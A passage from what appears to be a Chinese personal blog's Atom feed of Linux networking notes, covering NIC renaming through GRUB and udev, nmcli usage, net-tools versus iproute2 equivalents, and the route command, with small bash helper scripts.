title="&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;"></a>&#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;</h2><blockquote><p>&#x6B64;&#x529F;&#x80FD;&#x901A;&#x8FC7;<code>/etc/default/grub</code>&#x6587;&#x4EF6;&#x6765;&#x63A7;&#x5236;&#xFF0C;&#x8981;&#x7981;&#x7528;&#x6B64;&#x529F;&#x80FD;&#xFF0C;&#x5728;&#x6587;&#x4EF6;&#x4E2D;GRUB_CMDLINE_LINUX&#x884C;&#x7684;&#x672B;&#x5C3E;&#x52A0;&#x5165;<code>net.ifnames=0  biosdevname=0</code>&#x5373;&#x53EF;</p></blockquote><pre><code>[root@ctos74 ~]$ cat /etc/default/grub</code></pre><pre><code class="ini">GRUB_TIMEOUT=5GRUB_DISTRIBUTOR=&quot;$(sed &apos;s, release .*$,,g&apos; /etc/system-release)&quot;GRUB_DEFAULT=savedGRUB_DISABLE_SUBMENU=trueGRUB_TERMINAL_OUTPUT=&quot;console&quot;GRUB_CMDLINE_LINUX=&quot;rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet&quot;GRUB_DISABLE_RECOVERY=&quot;true&quot;</code></pre><pre><code class="shell">sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub</code></pre><h2 id="&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;"><a href="#&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;" class="headerlink" title="&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;"></a>&#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;</h2><p>rhel7&#x4E2D;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x5230;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<code>70-persistent-ipoib.rules</code>&#x4E2D;<br>CentOS&#x76F4;&#x63A5;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;<code>70-persistent-net.rules</code>&#x6587;&#x4EF6;</p><pre><code class="shell">SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,DRIVERS==&quot;?*&quot;,ATTR{address}==&quot;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x540D;&#x79F0;&#x7684;&#x7F51;&#x5361;MAC&#x5730;&#x5740;&quot;,ATTR&#xFF5B;type&#xFF5D;==&quot;1&quot; ,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;</code></pre><h2 id="&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;"><a href="#&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;" class="headerlink" title="&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;"></a>&#x66F4;&#x65B0;grub&#x914D;&#x7F6E;</h2><pre><code>grub2-mkconfig -o /boot/grub2/grub.cfg</code></pre><hr><h2 id="&#x6269;&#x5C55;&#xFF1A;-shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;"><a href="#&#x6269;&#x5C55;&#xFF1A;-shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A; shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;"></a>&#x6269;&#x5C55;&#xFF1A; shell&#x811A;&#x672C;&#x5B9E;&#x73B0;&#x4EE5;&#x4E0A;&#x5168;&#x90E8;&#x64CD;&#x4F5C;</h2><pre><code class="shell">#!/bin/bashNetInterfaceNameRules(){# &#x4FEE;&#x6539;&#x7F51;&#x5361;&#x540D;&#x79F0;cp /etc/sysconfig/network-scripts/ifcfg-ens33 /etc/sysconfig/network-scripts/backupens33echo -e &quot;\e[1;32m&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5907;&#x4EFD;&#x5728;/etc/sysconfig/network-scripts/backupens33\e[0m&quot;/usr/bin/sed -i &apos;s/NAME=ens33/NAME=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33/usr/bin/sed -i &apos;s/DEVICE=ens33/DEVICE=eth0/g&apos; /etc/sysconfig/network-scripts/ifcfg-ens33# &#x7981;&#x7528;&#x7F51;&#x5361;&#x547D;&#x540D;&#x89C4;&#x5219;cp /etc/default/grub /etc/default/backupgrubecho -e &quot;\e[1;32m&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#xFF1A;backupgrub\e[0m&quot;/usr/bin/sed -i &apos;s/swap rhgb quiet/&amp; net.ifnames=0 biosdevname=0/&apos; /etc/default/grub# &#x6DFB;&#x52A0;udev&#x7F51;&#x5361;&#x89C4;&#x5219;MAC_ADDR=`ip link show dev ens33 | awk &apos;END{ print $NR }&apos;`if [ -f /etc/udev/rules.d/70-persistent-ipoib.rules ]then    /usr/bin/sed -i &apos;$a SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\&quot;&quot;$MAC_ADDR&quot;\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; /etc/udev/rules.d/70-persistent-*else    /usr/bin/echo &apos;SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, DRIVERS==&quot;?*&quot;, ATTR{addresss}==&apos;\&quot;&quot;$MAC_ADDR&quot;\&quot;&apos;,ATTR{type}==&quot;1&quot;,KERNEL==&quot;eth*&quot;,NAME=&quot;eth0&quot;&apos; &gt;&gt; /etc/udev/rules.d/70-persistent-net.rulesfisudo /usr/sbin/grub2-mkconfig -o /boot/grub2/grub.cfg}NetInterfaceNameRules</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x4FEE;&amp;#x6539;&amp;#x7F51;&amp;#x5361;&amp;#x540D;&amp;#x79F0;&quot;&gt;&lt;a href=&quot;#&amp;#x4FEE;&amp;#x6539;&amp;#x7F51;&amp;#x5361;&amp;#x540D;&amp;#x79F0;&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NetworkManager管理工具</title>
    <link href="https://marnm.github.io//posts/1876d05d/"/>
    <id>https://marnm.github.io//posts/1876d05d/</id>
    <published>2022-06-07T04:41:12.000Z</published>
    <updated>2022-06-07T05:19:51.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NetworkManager-&#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;"><a href="#NetworkManager-&#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;" class="headerlink" title="NetworkManager &#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;"></a>NetworkManager &#x7F51;&#x7EDC;&#x7BA1;&#x7406;&#x5DE5;&#x5177;</h1><p>NetworkManager&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>networkmanager</code>&#x5305;&#x5B89;&#x88C5;&#xFF0C;&#x5B89;&#x88C5;&#x540E;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;daemon&#x3001;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x754C;&#x9762;<code>nmcli</code>&#x548C;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;curses&#x7684;&#x754C;&#x9762;<code>nmtui</code>&#x3002;</p><p><strong>&#x542F;&#x7528;&#x4E0E;&#x5173;&#x95ED;</strong></p><p>&#x901A;&#x8FC7;<code>NetworkManager.service</code>systemd&#x670D;&#x52A1;&#x542F;&#x52A8;&#x4E0E;&#x5173;&#x95ED;</p><h3 id="&#x8BED;&#x6CD5;"><a href="#&#x8BED;&#x6CD5;" class="headerlink" title="&#x8BED;&#x6CD5;"></a>&#x8BED;&#x6CD5;</h3><pre><code class="shell">nmcli [OPTIONS] OBJECT { COMMAND | help }</code></pre><h3 id="&#x9009;&#x9879;"><a href="#&#x9009;&#x9879;" class="headerlink" title="&#x9009;&#x9879;"></a>&#x9009;&#x9879;</h3><pre><code class="shell">OPTIONS  -t[erse]                                  # terse output &#x7B80;&#x6D01;&#x7684;&#x8F93;&#x51FA;  -p[retty]                                 # pretty output &#x6F02;&#x4EAE;&#x7684;&#x8F93;&#x51FA;  -m[ode] tabular|multiline                 # output mode  &#x8F93;&#x51FA;&#x6A21;&#x5F0F;  -f[ields] &lt;field1,field2,...&gt;|all|common  # specify fields to output &#x6307;&#x5B9A;&#x8981;&#x8F93;&#x51FA;&#x7684;&#x5B57;&#x6BB5;  -e[scape] yes|no                          # escape columns separators in values &#x5728;&#x503C;&#x4E2D;&#x8F6C;&#x4E49;&#x5217;&#x5206;&#x9694;&#x7B26;  -n[ocheck]                                # &#x4E0D;&#x8981;&#x68C0;&#x67E5;nmcli&#x548C;NetworkManager&#x7248;&#x672C;  -a[sk]                                    # &#x8981;&#x6C42;&#x7F3A;&#x5C11;&#x53C2;&#x6570;  -w[ait] &lt;seconds&gt;                         # &#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x7B49;&#x5F85;&#x6574;&#x7406;&#x64CD;&#x4F5C;  -v[ersion]                                # &#x663E;&#x793A;&#x7A0B;&#x5E8F;&#x7248;&#x672C;  -h[elp]                                   # &#x6253;&#x5370;&#x6B64;&#x5E2E;&#x52A9;OBJECT  g[eneral]       NetworkManager&#x7684;&#x4E00;&#x822C;&#x72B6;&#x6001;&#x548C;&#x64CD;&#x4F5C;  n[etworking]    &#x6574;&#x4F53;&#x7EC4;&#x7F51;&#x63A7;&#x5236;  r[adio]         NetworkManager&#x5207;&#x6362;&#x5F00;&#x5173;  c[onnection]    NetworkManager&#x7684;&#x8FDE;&#x63A5;  d[evice]        &#x7531;NetworkManager&#x7BA1;&#x7406;&#x7684;&#x8BBE;&#x5907;  a[gent]         NetworkManager&#x79D8;&#x5BC6;&#x4EE3;&#x7406;&#x6216;polkit&#x4EE3;&#x7406;</code></pre><h3 id="&#x5B9E;&#x4F8B;"><a href="#&#x5B9E;&#x4F8B;" class="headerlink" title="&#x5B9E;&#x4F8B;"></a>&#x5B9E;&#x4F8B;</h3><pre><code class="shell">nmcli connection show            # &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;nmcli connection reload          # &#x91CD;&#x542F;&#x670D;&#x52A1;nmcli connection show -active    # &#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;nmcli connection show &quot;lan eth0&quot; # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x914D;&#x7F6E;nmcli device status              # &#x663E;&#x793A;&#x8BBE;&#x5907;&#x72B6;&#x6001;nmcli device show eno16777736    # &#x663E;&#x793A;&#x6307;&#x5B9A;&#x63A5;&#x53E3;&#x5C5E;&#x6027;nmcli device show                # &#x663E;&#x793A;&#x5168;&#x90E8;&#x63A5;&#x53E3;&#x5C5E;&#x6027;nmcli con up static              # &#x542F;&#x7528;static&#x8FDE;&#x63A5;&#x914D;&#x7F6E;nmcli con up default             # &#x542F;&#x7528;default&#x8FDE;&#x63A5;&#x914D;&#x7F6E; nmcli con add help               # &#x67E5;&#x770B;&#x5E2E;&#x52A9;</code></pre><h3 id="&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;"><a href="#&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;" class="headerlink" title="&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;"></a>&#x521B;&#x5EFA;&#x7F51;&#x7EDC;&#x4F1A;&#x8BDD;</h3><pre><code class="shell">nmcli connection add con-name company ifname ens33 autoconnect no type ethernet ip4 192.168.1.2/24 gw4 192.168.1.1# con-name &#x6307;&#x5B9A;&#x4F1A;&#x8BDD;&#x540D;&#x79F0;&#xFF0C;# ifname &#x6307;&#x5B9A;&#x672C;&#x673A;&#x7F51;&#x5361;# autoconnect no/yes &#x662F;&#x5426;&#x81EA;&#x52A8;&#x8FDE;&#x63A5;# type &#x6307;&#x5B9A;&#x7F51;&#x5361;&#x7C7B;&#x578B;ethernet# ip4/ip6# gw4/gw6</code></pre><pre><code class="shell">#!/bin/bash# nmcliecho &quot;NetworkManager&#x7BA1;&#x7406;&#x811A;&#x672C;&quot;echo -e &quot;1.&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8FDE;&#x63A5;&#x72B6;&#x6001;\n2.&#x91CD;&#x542F;&#x670D;&#x52A1;\n3.&#x663E;&#x793A;&#x6D3B;&#x52A8;&#x7684;&#x8FDE;&#x63A5;\n&quot;function net_stat(){    # &#x67E5;&#x770B;&#x5168;&#x90E8;&#x72B6;&#x6001;    nmcli connection show    # &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;        nmcli connection show $0}while truedoread -p &quot;&#x8BF7;&#x9009;&#x62E9;&#x60A8;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;&quot; infocase $info in1) nmcli connection show ;;*) echo -e &quot;\e[1;31mError! &#x683C;&#x5F0F;&#x9519;&#x8BEF;&#xFF01;\e[0m&quot;done</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NetworkManager-&amp;#x7F51;&amp;#x7EDC;&amp;#x7BA1;&amp;#x7406;&amp;#x5DE5;&amp;#x5177;&quot;&gt;&lt;a href=&quot;#NetworkManager-&amp;#x7F51;&amp;#x7EDC;&amp;#x7BA1;&amp;#x7406;&amp;#x5DE5;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>net-tools工具</title>
    <link href="https://marnm.github.io//posts/1939d3e2/"/>
    <id>https://marnm.github.io//posts/1939d3e2/</id>
    <published>2022-06-07T04:40:59.000Z</published>
    <updated>2022-06-07T05:20:03.867Z</updated>
    
    <content type="html"><![CDATA[<h1 id="net-tools&#x5DE5;&#x5177;&#x5305;"><a href="#net-tools&#x5DE5;&#x5177;&#x5305;" class="headerlink" title="net-tools&#x5DE5;&#x5177;&#x5305;"></a>net-tools&#x5DE5;&#x5177;&#x5305;</h1><table><thead><tr><th>net-tools</th><th>iproute2</th></tr></thead><tbody><tr><td>arp -na</td><td>ip neigh</td></tr><tr><td>ifconfig</td><td>ip link</td></tr><tr><td>ifconfig -a</td><td>ip addr show</td></tr><tr><td>ifconfig &#x2013;help</td><td>ip help</td></tr><tr><td>ifconfig -eth0 up</td><td>ip link set eth0 up</td></tr><tr><td>ipmaddr</td><td>ip maddr</td></tr><tr><td>iptunnel</td><td>ip tunnel</td></tr><tr><td>netstat</td><td>ss</td></tr><tr><td>netstat -i</td><td>ip -s link</td></tr><tr><td>netstat -g</td><td>ip maddr</td></tr><tr><td>netstat -l</td><td>ss -l</td></tr><tr><td>netstat -r</td><td>ip route</td></tr><tr><td>route add</td><td>ip route add</td></tr><tr><td>route del</td><td>ip route del</td></tr><tr><td>route -n</td><td>ip route show</td></tr><tr><td>vconfig</td><td>ip link</td></tr></tbody></table><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p><code>eth0</code>&#x3001;<code>eth0:1</code>&#x3001;<code>eth0.1</code>&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#xFF1A;<br><strong>&#x4E09;&#x8005;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#x5BF9;&#x5E94;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x3001;&#x5B50;&#x7F51;&#x5361;&#x3001;&#x865A;&#x62DF;VLAN&#x7F51;&#x5361;</strong>  </p><ul><li><strong>&#x7269;&#x7406;&#x7F51;&#x5361;</strong> &#x7269;&#x7406;&#x7F51;&#x5361;&#x8FD9;&#x91CC;&#x6307;&#x7684;&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;</li><li><strong>&#x5B50;&#x7F51;&#x5361;</strong> &#x5E76;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x5982;<code>eth0:1</code>&#x3001;<code>eth0:2</code>&#x3002;&#x5B83;&#x4EEC;&#x5FC5;&#x987B;&#x8981;&#x4F9D;&#x8D56;&#x4E8E;&#x7269;&#x7406;&#x7F51;&#x5361;&#xFF0C;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x4E0E;&#x7269;&#x7406;&#x7F51;&#x5361;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x540C;&#x65F6;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x5B58;&#x5728;&#x5E76;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x800C;&#x4E14;&#x4E5F;&#x62E5;&#x6709;&#x5B83;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4F46;&#x662F;&#x5F53;&#x5B83;&#x4F9D;&#x8D56;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x542F;&#x52A8;&#xFF08;Down&#xFF09;&#x65F6;&#xFF0C;&#x8FD9;&#x4E9B;&#x5B50;&#x7F51;&#x5361;&#x5C06;&#x4E0D;&#x80FD;&#x5DE5;&#x4F5C;</li><li><strong>&#x865A;&#x62DF;VLAN&#x7F51;&#x5361;</strong> &#x8FD9;&#x4E9B;&#x865A;&#x62DF;&#x7684;VLAN&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x662F;&#x5B9E;&#x9645;&#x4E0A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x8BBE;&#x5907;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x4F46;&#x662F;&#x4E0E;&#x5B50;&#x7F51;&#x5361;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x5B83;&#x4EEC;&#x6CA1;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x4ED6;&#x4EEC;&#x53EA;&#x662F;&#x901A;&#x8FC7;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x52A0;&#x5165;&#x4E0D;&#x540C;&#x7684;VLAN&#x800C;&#x751F;&#x6210;&#x7684;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x3002;&#x5982;&#x679C;&#x5C06;&#x7269;&#x7406;&#x7F51;&#x5361;&#x901A;&#x8FC7;vconfig&#x547D;&#x4EE4;&#x6DFB;&#x52A0;&#x5230;&#x591A;&#x4E2A;VLAN&#x4E2D;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x4F1A;&#x6709;&#x591A;&#x4E2A;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x4FE1;&#x606F;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x7684;VLAN&#x4FE1;&#x606F;&#x90FD;&#x662F;&#x4FDD;&#x5B58;&#x5728;/proc/net/vlan/config&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x800C;&#x6CA1;&#x6709;&#x72EC;&#x81EA;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;<br><strong>&#xFF01;</strong> &#x6CE8;&#x610F;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x542F;&#x7528;VLAN&#x865A;&#x62DF;&#x7F51;&#x5361;&#x5DE5;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5173;&#x8054;&#x7684;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0D;&#x80FD;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x4E14;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E3B;&#x7269;&#x7406;&#x7F51;&#x5361;&#x4E0A;&#x7684;&#x5B50;&#x7F51;&#x5361;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x542F;&#x7528;&#x548C;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x4FE1;&#x606F;&#x3002;&#xFF08;&#x9664;&#x4E86;802.1q&#x914D;&#x7F6E;&#x4E0B;&#xFF0C;&#x5728;&#x8BE5;&#x914D;&#x7F6E;&#x4E0B;&#x53EF;&#x4EE5;&#x914D;&#x7F6E;IP&#x5730;&#x5740;&#x7B49;&#x4FE1;&#x606F;&#xFF09;</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;net-tools&amp;#x5DE5;&amp;#x5177;&amp;#x5305;&quot;&gt;&lt;a href=&quot;#net-tools&amp;#x5DE5;&amp;#x5177;&amp;#x5305;&quot; class=&quot;headerlink&quot; title=&quot;net-tools&amp;#x5DE5;&amp;#x5177;&amp;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux路由配置——route</title>
    <link href="https://marnm.github.io//posts/365d0867/"/>
    <id>https://marnm.github.io//posts/365d0867/</id>
    <published>2022-06-07T04:40:40.000Z</published>
    <updated>2022-06-07T05:20:19.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="route"><a href="#route" class="headerlink" title="route"></a>route</h1><p>&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x4E2D;&#x9759;&#x6001;&#x8DEF;&#x7531;&#x8868;</p><h2 id="&#x8865;&#x5145;&#x8BF4;&#x660E;"><a href="#&#x8865;&#x5145;&#x8BF4;&#x660E;" class="headerlink" title="&#x8865;&#x5145;&#x8BF4;&#x660E;"></a>&#x8865;&#x5145;&#x8BF4;&#x660E;</h2><p><strong>route&#x547D;&#x4EE4;</strong> &#x7528;&#x6765;&#x663E;&#x793A;&#x5E76;&#x8BBE;&#x7F6E;Linux&#x5185;&#x6838;&#x4E2D;&#x7684;&#x7F51;&#x7EDC;&#x8DEF;&#x7531;&#x8868;&#xFF0C;<strong>route&#x547D;&#x4EE4;&#x8BBE;&#x7F6E;&#x7684;&#x8DEF;&#x7531;&#x4E3B;&#x8981;&#x662F;&#x9759;&#x6001;&#x8DEF;&#x7531;</strong>&#x3002;&#x8981;&#x5B9E;&#x73B0;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x5B50;&#x7F51;&#x4E4B;&#x95F4;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x53F0;&#x8FDE;&#x63A5;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x5668;&#xFF0C;&#x6216;&#x8005;&#x540C;&#x65F6;&#x4F4D;&#x4E8E;&#x4E24;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x7F51;&#x5173;&#x6765;&#x5B9E;&#x73B0;&#x3002;</p><p>&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;&#x901A;&#x5E38;&#x662F;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x4EE5;&#x4E0B;&#x95EE;&#x9898;&#xFF1A;&#x8BE5;Linux&#x7CFB;&#x7EDF;&#x5728;&#x4E00;&#x4E2A;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#xFF0C;&#x5C40;&#x57DF;&#x7F51;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x7F51;&#x5173;&#xFF0C;&#x80FD;&#x591F;&#x8BA9;&#x673A;&#x5668;&#x8BBF;&#x95EE;Internet&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x5C06;&#x8FD9;&#x53F0;&#x673A;&#x5668;&#x7684;ip&#x5730;&#x5740;&#x8BBE;&#x7F6E;&#x4E3A;Linux&#x673A;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x8DEF;&#x7531;&#x3002;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x6267;&#x884C;route&#x547D;&#x4EE4;&#x6765;&#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#xFF0C;&#x4E0D;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x5B58;&#xFF0C;&#x5F53;&#x7F51;&#x5361;&#x91CD;&#x542F;&#x6216;&#x8005;&#x673A;&#x5668;&#x91CD;&#x542F;&#x4E4B;&#x540E;&#xFF0C;&#x8BE5;&#x8DEF;&#x7531;&#x5C31;&#x5931;&#x6548;&#x4E86;&#xFF1B;&#x53EF;&#x4EE5;&#x5728;<code>/etc/rc.local</code>&#x4E2D;&#x6DFB;&#x52A0;route&#x547D;&#x4EE4;&#x6765;&#x4FDD;&#x8BC1;&#x8BE5;&#x8DEF;&#x7531;&#x8BBE;&#x7F6E;&#x6C38;&#x4E45;&#x6709;&#x6548;&#x3002;</p><h3 id="&#x8BED;&#x6CD5;"><a href="#&#x8BED;&#x6CD5;" class="headerlink" title="&#x8BED;&#x6CD5;"></a>&#x8BED;&#x6CD5;</h3><pre><code class="shell">route(&#x9009;&#x9879;)(&#x53C2;&#x6570;)</code></pre><h3 id="&#x9009;&#x9879;"><a href="#&#x9009;&#x9879;" class="headerlink" title="&#x9009;&#x9879;"></a>&#x9009;&#x9879;</h3><pre><code class="shell">-A&#xFF1A;&#x8BBE;&#x7F6E;&#x5730;&#x5740;&#x7C7B;&#x578B;&#xFF1B;-C&#xFF1A;&#x6253;&#x5370;&#x5C06;Linux&#x6838;&#x5FC3;&#x7684;&#x8DEF;&#x7531;&#x7F13;&#x5B58;&#xFF1B;-v&#xFF1A;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x6A21;&#x5F0F;&#xFF1B;-n&#xFF1A;&#x4E0D;&#x6267;&#x884C;DNS&#x53CD;&#x5411;&#x67E5;&#x627E;&#xFF0C;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x7684;IP&#x5730;&#x5740;&#xFF1B;-e&#xFF1A;netstat&#x683C;&#x5F0F;&#x663E;&#x793A;&#x8DEF;&#x7531;&#x8868;&#xFF1B;-net&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x8DEF;&#x7531;&#x8868;&#xFF1B;-host&#xFF1A;&#x5230;&#x4E00;&#x4E2A;&#x4E3B;&#x673A;&#x7684;&#x8DEF;&#x7531;&#x8868;&#x3002;</code></pre><h3 id="&#x53C2;&#x6570;"><a href="#&#x53C2;&#x6570;" class="headerlink" title="&#x53C2;&#x6570;"></a>&#x53C2;&#x6570;</h3><pre><code 